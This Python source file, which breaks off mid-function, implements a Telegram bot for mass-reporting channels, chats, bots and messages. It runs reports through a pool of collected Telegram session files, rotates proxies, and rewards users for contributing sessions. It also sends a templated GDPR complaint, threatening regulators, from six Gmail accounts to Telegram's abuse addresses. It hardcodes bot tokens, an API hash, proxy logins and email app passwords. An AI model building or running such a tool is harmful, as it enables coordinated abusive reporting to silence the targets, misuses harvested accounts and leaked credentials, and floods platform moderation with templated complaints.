import os
import sys
import asyncio
import smtplib
import json
import shutil
import random
import re
from datetime import datetime, timedelta
from email.message import EmailMessage
from pathlib import Path

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import FSInputFile, ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.exceptions import TelegramBadRequest

from pyrogram import Client
from pyrogram.errors import (
    UsernameNotOccupied, AuthKeyUnregistered, SessionRevoked,
    PeerIdInvalid, ChatAdminRequired, FloodWait, Unauthorized, SessionPasswordNeeded
)
from pyrogram.raw.functions.account import ReportPeer
from pyrogram.raw.functions.messages import Report
from pyrogram.raw.functions.updates import GetState
from pyrogram.raw.types import (
    InputReportReasonSpam,
    InputReportReasonViolence,
    InputReportReasonPornography,
    InputReportReasonChildAbuse,
    InputReportReasonCopyright,
    InputReportReasonFake,
    InputReportReasonOther
)

# ==================== КОНФИГУРАЦИЯ ====================
API_ID = 30827426
API_HASH = '86fa37df2a34f9f55763356cc80771aa'
BOT_TOKEN = '8599963490:AAEiEg8evSyVE8XxutVYNLq7HS888ZTFJ1o'

LOGGER_BOT_TOKEN = '8698879020:AAHrqLniUVI6T6Td3p95MgQBd7frlzuHdT8'
LOGGER_USER_ID = 8734413140
ADMIN_ID = 8734413140

SESSIONS_DIR = r"C:\Users\stalc\OneDrive\Desktop\sessions"
TIDA_SESSIONS_DIR = r"C:\Users\stalc\OneDrive\Desktop\Тида сессии"
TEMP_SESSIONS_DIR = r"C:\Users\stalc\OneDrive\Desktop\temp_sessions"

# ==================== СИСТЕМА ПРОКСИ ====================
PROXY_LIST = [
    {
        "url": "http://oevoGk:Ek0wBR@200.10.36.28:8000",
        "pyrogram": {
            "scheme": "http",
            "hostname": "200.10.36.28",
            "port": 8000,
            "username": "oevoGk",
            "password": "Ek0wBR"
        }
    },
    {
        "url": "http://fZShXz:M26ZAW@196.19.243.37:8000",
        "pyrogram": {
            "scheme": "http",
            "hostname": "196.19.243.37",
            "port": 8000,
            "username": "fZShXz",
            "password": "M26ZAW"
        }
    }
]

CURRENT_PROXY_INDEX = 0

def get_current_proxy():
    global CURRENT_PROXY_INDEX
    return PROXY_LIST[CURRENT_PROXY_INDEX]

def switch_to_next_proxy():
    global CURRENT_PROXY_INDEX
    CURRENT_PROXY_INDEX = (CURRENT_PROXY_INDEX + 1) % len(PROXY_LIST)
    print(f"🔄 Переключение на прокси #{CURRENT_PROXY_INDEX + 1}: {PROXY_LIST[CURRENT_PROXY_INDEX]['pyrogram']['hostname']}")
    return PROXY_LIST[CURRENT_PROXY_INDEX]

EMAIL_ACCOUNTS = {
    'stamblgajs72@gmail.com': 'bwkjzazuyktobudc',
    'stalcraft.dolg@gmail.com': 'subgquehggwblzoq',
    'lunaskin6641@gmail.com': 'xmdfhbpililpzqel',
    'execlos6641@gmail.com': 'wphffjbfpiarkfmj',
    'closexe3@gmail.com': 'jfyitkswsnhfaaul',
    'tikkok666@gmail.com': 'gsmqduhqjjyfjfzt'
}
REPORT_EMAILS = ['dsa@telegram.org', 'support@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org']
GDPR_EMAILS = ['privacy@telegram.org', 'abuse@telegram.org']

HISTORY_FILE = "report_history.json"
COOLDOWN_FILE = "cooldowns.json"
USERS_FILE = "users_data.json"

RANKS = {
    'user': {'name': 'Пользователь', 'base_limit': 3, 'cooldown': 300},
    'helper': {'name': 'Помощник', 'base_limit': 5, 'cooldown': 150},
    'admin': {'name': 'Администратор', 'base_limit': 999, 'cooldown': 0}
}

# ==================== НАГРАДЫ ЗА СЕССИИ ====================
def calculate_session_reward(session_type, phone, dc_id):
    reward = 0
    if session_type == 'session_tida':
        reward += 1
    elif phone.startswith('+1') or phone.startswith('1'):
        reward += 1
    if dc_id == 2:
        reward += 3
    elif dc_id in (4, 5):
        reward += 2
    return reward

# ==================== ИНИЦИАЛИЗАЦИЯ ====================
proxy_session = AiohttpSession(proxy=get_current_proxy()["url"])
bot = Bot(token=BOT_TOKEN, session=proxy_session)
dp = Dispatcher()
user_states = {}

os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(TIDA_SESSIONS_DIR, exist_ok=True)
os.makedirs(TEMP_SESSIONS_DIR, exist_ok=True)
os.makedirs("screenshots", exist_ok=True)

# ==================== УТИЛИТЫ ====================
async def safe_callback_answer(callback: types.CallbackQuery, text: str = None, show_alert: bool = False):
    try:
        await callback.answer(text, show_alert=show_alert)
    except TelegramBadRequest:
        pass

async def safe_edit_or_send(message, text, reply_markup=None, parse_mode=None):
    try:
        await message.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
    except:
        try:
            await message.answer(text, reply_markup=reply_markup, parse_mode=parse_mode)
        except:
            pass

def get_reason_obj(reason_str):
    mapping = {
        'ChildAbuse': InputReportReasonChildAbuse(),
        'Pornography': InputReportReasonPornography(),
        'Violence': InputReportReasonViolence(),
        'Fake': InputReportReasonFake(),
        'Scam': InputReportReasonOther(),
        'Spam': InputReportReasonSpam(),
        'PersonalDetails': InputReportReasonOther(),
        'Copyright': InputReportReasonCopyright(),
        'Drugs': InputReportReasonOther(),
        'Other': InputReportReasonOther()
    }
    return mapping.get(reason_str, InputReportReasonSpam())

async def create_working_client(session_path):
    session_name = str(session_path).replace(".session", "")
    proxy_config = get_current_proxy()["pyrogram"]
    return Client(
        name=session_name,
        api_id=API_ID,
        api_hash=API_HASH,
        proxy=proxy_config,
        sleep_threshold=30
    )

async def get_dc_id(client):
    try:
        state = await client.invoke(GetState())
        return state.dc_id
    except:
        return None

def parse_telegram_link(link):
    link = link.strip()
    if link.startswith('https://'):
        link = link[8:]
    elif link.startswith('http://'):
        link = link[7:]
    if link.startswith('t.me/'):
        link = link[5:]
    if link.startswith('@'):
        link = link[1:]
    if '/' in link:
        parts = link.split('/')
        username = parts[0]
        try:
            message_id = int(parts[1])
            return username, message_id
        except (ValueError, IndexError):
            return username, None
    else:
        return link, None

def generate_gdpr_complaint(channel_link, violation_link, user_id_or_username, has_profile):
    if has_profile and user_id_or_username:
        user_info = f"The violating content was posted by user: {user_id_or_username}"
    else:
        user_info = "The violating content was posted by an anonymous user (profile not available)"
    complaint_text = f"""To the Data Protection Officer (DPO) of Telegram,

I am writing to formally report a severe and ongoing violation of the General Data Protection Regulation (EU) 2016/679 (GDPR) occurring on your platform.

Channel/Chat Link: {channel_link}
Violation Link: {violation_link}

{user_info}

Nature of Violation:
The aforementioned channel/user is illegally publishing, distributing, and processing Personally Identifiable Information (PII) of individuals without their explicit, informed consent. The leaked data includes personal information that can be used to identify real individuals, constituting a direct violation of their privacy rights.

Legal Basis for Removal:
1. Article 5 (Principles relating to processing): The processing is unlawful, unfair, and lacks transparency.
2. Article 6 (Lawfulness of processing): There is no valid legal basis or consent from the data subjects for this publication.
3. Article 17 (Right to erasure / "Right to be forgotten"): The data subjects demand the immediate erasure of their personal data.

Action Required:
As the platform facilitating this illegal data processing, Telegram is obligated under the GDPR to act expeditiously. I request the immediate removal of the violating content and the termination of the offending channel/user account to prevent further irreversible harm to the data subjects.

Failure to act within 72 hours will result in a formal complaint being lodged with the relevant national Data Protection Authority (DPA) and the European Data Protection Board (EDPB) against Telegram for non-compliance.

Sincerely,
Concerned Individual
"""
    return complaint_text

# ==================== СИСТЕМА ПОЛЬЗОВАТЕЛЕЙ ====================
def load_users_data():
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_users_data(data):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def get_user_data(user_id, username=None):
    data = load_users_data()
    user_id_str = str(user_id)
    if user_id_str not in data:
        data[user_id_str] = {
            'username': username or 'unknown',
            'first_use': datetime.now().strftime('%Y-%m-%d'),
            'is_admin': (user_id == ADMIN_ID),
            'is_helper': False,
            'is_banned': False,
            'requests_today': 0,
            'last_reset': datetime.now().strftime('%Y-%m-%d'),
            'history': [],
            'daily_limit': 3
        }
        save_users_data(data)
    elif username and data[user_id_str]['username'] == 'unknown':
        data[user_id_str]['username'] = username
        save_users_data(data)
    return data[user_id_str]

def get_user_rank(user_data):
    if user_data.get('is_admin'):
        return 'admin'
    if user_data.get('is_helper'):
        return 'helper'
    return 'user'

def get_daily_limit(user_data):
    rank = get_user_rank(user_data)
    if rank == 'admin':
        return 999
    return user_data.get('daily_limit', RANKS[rank]['base_limit'])

def get_cooldown_time(user_data):
    rank = get_user_rank(user_data)
    return RANKS[rank]['cooldown']

def check_and_reset_daily(user_id):
    data = load_users_data()
    user_id_str = str(user_id)
    if user_id_str not in data:
        return 3
    today = datetime.now().strftime('%Y-%m-%d')
    if data[user_id_str]['last_reset'] != today:
        data[user_id_str]['requests_today'] = 0
        data[user_id_str]['last_reset'] = today
        save_users_data(data)
    limit = get_daily_limit(data[user_id_str])
    return limit - data[user_id_str]['requests_today']

def use_request(user_id, method, target, reason, status):
    data = load_users_data()
    user_id_str = str(user_id)
    if user_id_str not in data:
        return False
    limit = get_daily_limit(data[user_id_str])
    if data[user_id_str]['requests_today'] >= limit:
        return False
    data[user_id_str]['requests_today'] += 1
    data[user_id_str]['history'].append({
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'method': method,
        'target': target,
        'reason': reason,
        'status': status
    })
    data[user_id_str]['history'] = data[user_id_str]['history'][-500:]
    save_users_data(data)
    return True

def is_user_banned(user_id):
    return load_users_data().get(str(user_id), {}).get('is_banned', False)

def is_user_admin(user_id):
    return user_id == ADMIN_ID

def load_json(filename, default=None):
    if default is None:
        default = {}
    try:
        if os.path.exists(filename):
            with open(filename, 'r', encoding='utf-8') as f:
                return json.load(f)
    except:
        pass
    return default

def save_json(filename, data):
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def load_history():
    return load_json(HISTORY_FILE, {'reports': []})

def save_report_to_history(user_id, method, target, reason, status):
    history = load_history()
    history['reports'].append({
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'user_id': user_id,
        'method': method,
        'target': target,
        'reason': reason,
        'status': status
    })
    history['reports'] = history['reports'][-100:]
    save_json(HISTORY_FILE, history)

def check_cooldown(user_id, method):
    if is_user_admin(user_id):
        return False, 0
    cooldowns = load_json(COOLDOWN_FILE, {})
    key = f"{user_id}_{method}"
    user_data = get_user_data(user_id)
    cd_time = get_cooldown_time(user_data)
    if key in cooldowns:
        remaining = cd_time - (datetime.now() - datetime.fromisoformat(cooldowns[key])).total_seconds()
        if remaining > 0:
            return True, int(remaining)
    return False, 0

def set_cooldown(user_id, method):
    if is_user_admin(user_id):
        return
    cooldowns = load_json(COOLDOWN_FILE, {})
    cooldowns[f"{user_id}_{method}"] = datetime.now().isoformat()
    save_json(COOLDOWN_FILE, cooldowns)

def get_sessions_from_dir(directory):
    return list(Path(directory).glob("*.session"))

# ==================== ЛОГГЕР ====================
async def send_log_report(method, target, reason, success_count, total_count, user_id, full_text=None):
    try:
        global proxy_session
        try:
            logger_bot = Bot(token=LOGGER_BOT_TOKEN, session=proxy_session)
        except Exception:
            switch_to_next_proxy()
            proxy_session = AiohttpSession(proxy=get_current_proxy()["url"])
            logger_bot = Bot(token=LOGGER_BOT_TOKEN, session=proxy_session)

        user_data = get_user_data(user_id)
        username = user_data.get('username', 'unknown')

        method_emoji = {
            'TIDAbot': '🤖 БОТ',
            'Email': '📧 ПОЧТА',
            'GDPR': '📜 GDPR',
            'Botnet (report_channel)': '🤖 БОТНЕТ (КАНАЛ)',
            'Botnet (report_chat)': '🤖 БОТНЕТ (ЧАТ)',
            'Botnet (report_bot)': '🤖 БОТНЕТ (БОТ)',
            'Botnet (report_message)': '🤖 БОТНЕТ (СООБЩЕНИЕ)'
        }.get(method, '🤖 БОТНЕТ')

        if success_count == total_count:
            status_emoji = '🟢 — 🚀 Отлично'
        elif success_count > total_count * 0.5:
            status_emoji = '🟡 — ⚠️ Частично'
        elif success_count > 0:
            status_emoji = '🔵 — 📉 Минимально'
        else:
            status_emoji = '🔴 — ❌ Провал'

        target_link = target
        if target.startswith('http'):
            target_link = target
        elif target.startswith('@'):
            target_link = f"https://t.me/{target[1:]}"
        elif target.startswith('t.me/'):
            target_link = f"https://{target}"
        else:
            target_link = f"https://t.me/{target}"

        reason_display = reason
        if full_text:
            if method == 'GDPR':
                reason_display = full_text
            else:
                reason_display = full_text[:100] + "..."

        def esc(text):
            return str(text).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

        header = "🚀 НОВЫЙ РЕПОРТ"

        if method == 'GDPR':
            quoted = (
                f"👤 Юзер: @{esc(username)} ({esc(user_id)})\n"
                f"📌 Метод: {esc(method_emoji)}\n"
                f"🎯 Цель: {esc(target)}\n"
                f"📄 Нарушение: {esc(target_link)}\n"
                f"✅ Успешно: {success_count} {esc(status_emoji)}\n"
                f"🕐 Время: {datetime.now().strftime('%d.%m %H:%M')}\n\n"
                f"📝 <b>Полный текст жалобы:</b>\n<pre>{esc(reason_display)}</pre>"
            )
            log_text = f"{header}\n\n{quoted}"
        else:
            quoted = (
                f"👤 Юзер: @{esc(username)} ({esc(user_id)})\n"
                f"📌 Метод: {esc(method_emoji)}\n"
                f"🎯 Цель: {esc(target)} ({esc(target_link)})\n"
                f"🚀 Причина: {esc(reason_display)} 📌\n"
                f"✅ Успешно: {success_count} {esc(status_emoji)}\n"
                f"🕐 Время: {datetime.now().strftime('%d.%m %H:%M')}"
            )
            log_text = f"{header}\n\n<blockquote>{quoted}</blockquote>"

        await logger_bot.send_message(LOGGER_USER_ID, log_text, parse_mode="HTML")
        await logger_bot.session.close()
    except Exception as e:
        print(f"Ошибка лога: {e}")

def reply_menu_keyboard():
    return ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="Меню")]], resize_keyboard=True)

async def send_main_menu_with_photo(target, user_id=None):
    image_path = "start_image.jpg"
    inline_kb = main_menu_keyboard(user_id)
    caption = "👋 Привет! Я многофункциональный бот для репортов.\nВыберите раздел:"
    if os.path.exists(image_path):
        try:
            photo = FSInputFile(image_path)
            if isinstance(target, types.Message):
                await target.answer_photo(photo=photo, caption=caption, reply_markup=inline_kb)
            else:
                await target.message.answer_photo(photo=photo, caption=caption, reply_markup=inline_kb)
        except:
            if isinstance(target, types.Message):
                await target.answer(caption, reply_markup=inline_kb)
            else:
                await target.message.answer(caption, reply_markup=inline_kb)
    else:
        if isinstance(target, types.Message):
            await target.answer(caption, reply_markup=inline_kb)
        else:
            await target.message.answer(caption, reply_markup=inline_kb)

async def show_reply_menu_button(target):
    reply_kb = reply_menu_keyboard()
    if isinstance(target, types.Message):
        await target.answer("👇 Кнопка Меню появилась под полем ввода", reply_markup=reply_kb)
    else:
        await target.message.answer("👇 Кнопка Меню появилась под полем ввода", reply_markup=reply_kb)

# ==================== КЛАВИАТУРЫ ====================
def main_menu_keyboard(user_id=None):
    builder = InlineKeyboardBuilder()
    builder.button(text="📤 Отправка", callback_data="send_menu")
    builder.button(text="👤 Профиль", callback_data="profile")
    builder.button(text="📖 Инструкция", callback_data="instructions")
    builder.button(text="➕ Добавить сессию", callback_data="add_session_type")
    if user_id and is_user_admin(user_id):
        builder.button(text="⚙️ Админ-панель", callback_data="admin_panel")
    builder.adjust(1)
    return builder.as_markup()

def send_menu_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="🎯 TIDAbot", callback_data="tidabot_start")
    builder.button(text="🤖 Ботнет", callback_data="botnet_start")
    builder.button(text="📝 Текст", callback_data="text_menu")
    builder.button(text="🔙 Назад", callback_data="main_menu")
    builder.adjust(1)
    return builder.as_markup()

def text_menu_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="📧 Почта", callback_data="emails_menu")
    builder.button(text="📜 GDPR", callback_data="gdpr_menu")
    builder.button(text="🔙 Назад", callback_data="send_menu")
    builder.adjust(1)
    return builder.as_markup()

def session_type_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="📱 Обычная сессия", callback_data="session_normal")
    builder.button(text="🎯 Tida сессия", callback_data="session_tida")
    builder.button(text="🔙 Назад", callback_data="main_menu")
    builder.adjust(1)
    return builder.as_markup()

def profile_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="🔄 Обновить", callback_data="profile")
    builder.button(text="📜 История", callback_data="profile_history_0")
    builder.button(text="🔙 Назад", callback_data="main_menu")
    builder.adjust(1)
    return builder.as_markup()

def profile_history_keyboard(page=0, total_pages=1):
    builder = InlineKeyboardBuilder()
    if page > 0:
        builder.button(text="⬅️ Назад", callback_data=f"profile_history_{page-1}")
    if page < total_pages - 1:
        builder.button(text="➡️ Вперед", callback_data=f"profile_history_{page+1}")
    builder.button(text="🔙 К профилю", callback_data="profile")
    builder.adjust(2)
    return builder.as_markup()

def report_target_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="📢 Канал", callback_data="report_channel")
    builder.button(text="💬 Чат", callback_data="report_chat")
    builder.button(text="🤖 Бот", callback_data="report_bot")
    builder.button(text="📄 Сообщение", callback_data="report_message")
    builder.button(text="🔙 Назад", callback_data="send_menu")
    builder.adjust(2)
    return builder.as_markup()

def visibility_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="🌐 Открытый", callback_data="visibility_open")
    builder.button(text="🔒 Закрытый", callback_data="visibility_closed")
    builder.button(text="🔙 Назад", callback_data="send_menu")
    builder.adjust(2)
    return builder.as_markup()

def scope_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="📋 Весь канал/чат", callback_data="scope_full")
    builder.button(text="📍 Конкретное сообщение", callback_data="scope_message")
    builder.button(text="🔙 Назад", callback_data="send_menu")
    builder.adjust(1)
    return builder.as_markup()

def reasons_keyboard():
    builder = InlineKeyboardBuilder()
    reasons = [
        ("🔞 Детское порно", "ChildAbuse"),
        ("🔞 Порно", "Pornography"),
        ("⚔️ Насилие", "Violence"),
        ("🎭 Фейк", "Fake"),
        ("💸 Скам", "Scam"),
        ("📢 Спам", "Spam"),
        ("👤 Персональные данные", "PersonalDetails"),
        ("💊 Наркотики", "Drugs"),
        ("©️ Авторское право", "Copyright"),
        ("❓ Другое", "Other")
    ]
    for text, data in reasons:
        builder.button(text=text, callback_data=f"reason_{data}")
    builder.button(text="🔙 Назад", callback_data="send_menu")
    builder.adjust(2)
    return builder.as_markup()

def gdpr_has_profile_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="✅ Да, есть профиль", callback_data="gdpr_has_profile_yes")
    builder.button(text="❌ Нет, профиль скрыт", callback_data="gdpr_has_profile_no")
    builder.button(text="🔙 Назад", callback_data="text_menu")
    builder.adjust(1)
    return builder.as_markup()

def admin_panel_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="👥 Пользователи", callback_data="admin_users")
    builder.button(text="📢 Написать всем", callback_data="admin_broadcast")
    builder.button(text="📋 Чендж лист", callback_data="admin_changelog")
    builder.button(text="👁️ Просмотр сессий", callback_data="admin_view_sessions")
    builder.button(text="🗑️ Удалить сессию", callback_data="admin_delete_session")
    builder.button(text="🔙 Назад", callback_data="main_menu")
    builder.adjust(1)
    return builder.as_markup()

def admin_view_sessions_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="📱 Обычные сессии", callback_data="admin_view_dir_normal")
    builder.button(text="🎯 Tida сессии", callback_data="admin_view_dir_tida")
    builder.button(text="🔙 Назад", callback_data="admin_panel")
    builder.adjust(1)
    return builder.as_markup()

def admin_session_view_keyboard(directory, page=0):
    sessions = get_sessions_from_dir(directory)
    per_page = 8
    start, end = page * per_page, page * per_page + per_page
    builder = InlineKeyboardBuilder()
    for session_file in sessions[start:end]:
        builder.button(text=f"📄 {session_file.name}", callback_data=f"admin_sess_view_{directory}|{session_file.name}")
    builder.adjust(1)
    if page > 0:
        builder.button(text="⬅️ Назад", callback_data=f"admin_view_dir_page_{directory}_{page-1}")
    if end < len(sessions):
        builder.button(text="➡️ Вперед", callback_data=f"admin_view_dir_page_{directory}_{page+1}")
    builder.button(text="🔙 К папкам", callback_data="admin_view_sessions")
    return builder.as_markup()

def admin_session_view_actions_keyboard(directory, filename):
    builder = InlineKeyboardBuilder()
    builder.button(text="🗑️ Удалить", callback_data=f"admin_sess_delete_from_view_{directory}|{filename}")
    builder.button(text="🔙 Назад", callback_data=f"admin_view_dir_{directory}_0")
    builder.adjust(1)
    return builder.as_markup()

def admin_users_keyboard(page=0):
    data = load_users_data()
    users = list(data.items())
    per_page = 8
    start, end = page * per_page, page * per_page + per_page
    builder = InlineKeyboardBuilder()
    for user_id_str, user_data in users[start:end]:
        uid = int(user_id_str)
        username = user_data.get('username', 'unknown')
        rank = get_user_rank(user_data)
        rank_emoji = "⭐" if rank == 'admin' else ("🛡️" if rank == 'helper' else "")
        if user_data.get('is_banned'):
            rank_emoji = "🔒"
        builder.button(text=f"{rank_emoji} {username} ({uid})", callback_data=f"admin_user_{user_id_str}")
    builder.adjust(1)
    if page > 0:
        builder.button(text="⬅️ Назад", callback_data=f"admin_users_{page-1}")
    if end < len(users):
        builder.button(text="➡️ Вперед", callback_data=f"admin_users_{page+1}")
    builder.button(text="🔙 К админке", callback_data="admin_panel")
    return builder.as_markup()

def admin_user_actions_keyboard(user_id_str):
    data = load_users_data().get(user_id_str, {})
    rank = get_user_rank(data)
    builder = InlineKeyboardBuilder()
    builder.button(text="🔒 Заблокировать", callback_data=f"admin_ban_{user_id_str}")
    builder.button(text="🔓 Разблокировать", callback_data=f"admin_unban_{user_id_str}")
    if rank == 'admin':
        builder.button(text="❌ Забрать админку", callback_data=f"admin_remove_admin_{user_id_str}")
    elif rank == 'helper':
        builder.button(text="❌ Забрать помощника", callback_data=f"admin_remove_helper_{user_id_str}")
    else:
        builder.button(text="🛡️ Сделать помощником", callback_data=f"admin_make_helper_{user_id_str}")
        builder.button(text="⭐ Дать админку", callback_data=f"admin_make_admin_{user_id_str}")
    builder.button(text="➕ Добавить запросы", callback_data=f"admin_add_req_{user_id_str}")
    builder.button(text="➖ Забрать запросы", callback_data=f"admin_sub_req_{user_id_str}")
    builder.button(text="🔙 К пользователям", callback_data="admin_users")
    builder.adjust(1)
    return builder.as_markup()

def admin_add_requests_keyboard(user_id_str):
    builder = InlineKeyboardBuilder()
    builder.button(text="+5 запросов", callback_data=f"admin_req_add_{user_id_str}_5")
    builder.button(text="+10 запросов", callback_data=f"admin_req_add_{user_id_str}_10")
    builder.button(text="+50 запросов", callback_data=f"admin_req_add_{user_id_str}_50")
    builder.button(text="♾️ Безлимит", callback_data=f"admin_req_unlimit_{user_id_str}")
    builder.button(text="🔙 Назад", callback_data=f"admin_user_{user_id_str}")
    builder.adjust(2)
    return builder.as_markup()

def admin_sub_requests_keyboard(user_id_str):
    builder = InlineKeyboardBuilder()
    builder.button(text="-5 запросов", callback_data=f"admin_req_sub_{user_id_str}_5")
    builder.button(text="-10 запросов", callback_data=f"admin_req_sub_{user_id_str}_10")
    builder.button(text="-50 запросов", callback_data=f"admin_req_sub_{user_id_str}_50")
    builder.button(text="🔙 Назад", callback_data=f"admin_user_{user_id_str}")
    builder.adjust(2)
    return builder.as_markup()

def admin_session_folder_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="📱 Обычные сессии", callback_data="admin_sess_dir_normal")
    builder.button(text="🎯 Тида сессии", callback_data="admin_sess_dir_tida")
    builder.button(text="🔙 Назад", callback_data="admin_panel")
    builder.adjust(1)
    return builder.as_markup()

def admin_session_list_keyboard(directory, page=0):
    sessions = get_sessions_from_dir(directory)
    per_page = 8
    start, end = page * per_page, page * per_page + per_page
    builder = InlineKeyboardBuilder()
    for session_file in sessions[start:end]:
        builder.button(text=f"🗑️ {session_file.name}", callback_data=f"admin_sess_del_{directory}|{session_file.name}")
    builder.adjust(1)
    if page > 0:
        builder.button(text="⬅️ Назад", callback_data=f"admin_sess_list_{directory}_{page-1}")
    if end < len(sessions):
        builder.button(text="➡️ Вперед", callback_data=f"admin_sess_list_{directory}_{page+1}")
    builder.button(text="🔙 К папкам", callback_data="admin_delete_session")
    return builder.as_markup()

def admin_confirm_delete_keyboard(directory, filename):
    builder = InlineKeyboardBuilder()
    builder.button(text="✅ Да, удалить", callback_data=f"admin_sess_confirm_{directory}|{filename}")
    builder.button(text="❌ Отмена", callback_data=f"admin_sess_list_{directory}_0")
    builder.adjust(2)
    return builder.as_markup()

# ==================== GDPR ОТПРАВКА ====================
async def send_gdpr_email(channel_link, violation_link, user_id_or_username, has_profile):
    complaint_text = generate_gdpr_complaint(channel_link, violation_link, user_id_or_username, has_profile)
    success_count = 0
    total_emails = len(EMAIL_ACCOUNTS) * len(GDPR_EMAILS)
    for from_email, app_pwd in EMAIL_ACCOUNTS.items():
        for to_email in GDPR_EMAILS:
            try:
                msg = EmailMessage()
                msg['Subject'] = f"URGENT: GDPR Violation (Articles 5, 6, 17) - Illegal Processing of Personal Data - {channel_link}"
                msg['From'] = from_email
                msg['To'] = to_email
                msg.set_content(complaint_text)
                with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                    server.login(from_email, app_pwd)
                    server.send_message(msg)
                success_count += 1
                await asyncio.sleep(1.5)
            except Exception as e:
                print(f"GDPR Email ошибка: {e}")
                continue
    return success_count, total_emails, complaint_text

# ==================== ХЕНДЛЕРЫ ====================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    get_user_data(message.from_user.id, message.from_user.username)
    await send_main_menu_with_photo(message, message.from_user.id)
    await show_reply_menu_button(message)
    await message.answer(
        "⚠️ <b>Внимание!</b>\n\n"
        "Бот работает в режиме <b>бета-тестирования</b>.\n"
        "Функционал может быть нестабильным.\n\n"
        "После завершения бета-теста бот будет перенесён на хостинг и будет работать 24/7.",
        parse_mode="HTML"
    )

@dp.message(F.text == "Меню")
async def menu_button_handler(message: types.Message):
    await send_main_menu_with_photo(message, message.from_user.id)

@dp.callback_query(F.data == "main_menu")
async def main_menu(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    await send_main_menu_with_photo(callback, callback.from_user.id)

@dp.callback_query(F.data == "send_menu")
async def send_menu(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    await safe_edit_or_send(callback.message, "📤 <b>ВЫБЕРИТЕ МЕТОД ОТПРАВКИ:</b>", reply_markup=send_menu_keyboard(), parse_mode="HTML")

@dp.callback_query(F.data == "text_menu")
async def text_menu(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    await safe_edit_or_send(callback.message, "📝 <b>ТЕКСТОВЫЕ МЕТОДЫ</b>\n\nВыберите способ отправки:", reply_markup=text_menu_keyboard(), parse_mode="HTML")

@dp.callback_query(F.data == "instructions")
async def show_instructions(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    text = """📖 <b>ИНСТРУКЦИЯ ПО ИСПОЛЬЗОВАНИЮ</b>

Вся необходимая информация собрана в удобных статьях:

📌 <b>Методы работы бота:</b>
🔗 <a href="https://telegra.ph/Instrukciya-po-ispolzovaniyu-goydaEshkere-bot-09-05">Нажми здесь, чтобы открыть инструкцию</a>

📝 <b>Готовые тексты для репортов:</b>
🔗 <a href="https://telegra.ph/Teksta-dlya-tidy-i-pocht-09-05">Нажми здесь, чтобы открыть тексты</a>

💡 <i>Совет: Добавь эти статьи в "Избранное" в Telegram!</i>"""
    back_kb = InlineKeyboardBuilder()
    back_kb.button(text="🔙 Назад в меню", callback_data="main_menu")
    await safe_edit_or_send(callback.message, text, reply_markup=back_kb.as_markup(), parse_mode="HTML")

@dp.callback_query(F.data == "profile")
async def show_profile(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    user_id = callback.from_user.id
    user_data = get_user_data(user_id, callback.from_user.username)
    remaining = check_and_reset_daily(user_id)
    user_data = get_user_data(user_id)
    days_using = (datetime.now() - datetime.strptime(user_data['first_use'], '%Y-%m-%d')).days + 1
    limit = get_daily_limit(user_data)
    rank = get_user_rank(user_data)
    rank_name = RANKS[rank]['name']
    cd_time = get_cooldown_time(user_data)
    cd_min = cd_time // 60
    cd_sec = cd_time % 60
    badges = []
    if user_data.get('is_admin'):
        badges.append("⭐ АДМИН")
    if user_data.get('is_helper'):
        badges.append("🛡️ ПОМОЩНИК")
    if user_data.get('is_banned'):
        badges.append("🔒 ЗАБАНЕН")
    badges_str = " ".join(badges) if badges else ""
    text = (
        f"👤 <b>Профиль</b> {badges_str}\n\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"👤 Username: @{user_data['username']}\n"
        f"🏆 Ранг: {rank_name}\n"
        f"📅 Дней с ботом: {days_using}\n\n"
        f"📊 <b>Запросы сегодня:</b> {user_data['requests_today']}/{limit}\n"
        f"🎯 Осталось: {remaining}\n"
        f"⏳ Кулдаун: {cd_min} мин {cd_sec} сек"
    )
    await safe_edit_or_send(callback.message, text, reply_markup=profile_keyboard(), parse_mode="HTML")

@dp.callback_query(F.data.startswith("profile_history_"))
async def show_profile_history(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    user_id = callback.from_user.id
    page = int(callback.data.split("_")[-1])
    user_data = get_user_data(user_id)
    history = user_data.get('history', [])
    if not history:
        text = "📜 <b>История запросов</b>\n\nИстория пуста."
        back_kb = InlineKeyboardBuilder()
        back_kb.button(text="🔙 К профилю", callback_data="profile")
        await safe_edit_or_send(callback.message, text, reply_markup=back_kb.as_markup(), parse_mode="HTML")
        return
    history_reversed = list(reversed(history))
    per_page = 5
    total_pages = (len(history_reversed) + per_page - 1) // per_page
    if total_pages > 99:
        total_pages = 99
    if page >= total_pages:
        page = total_pages - 1
    start = page * per_page
    end = start + per_page
    page_items = history_reversed[start:end]
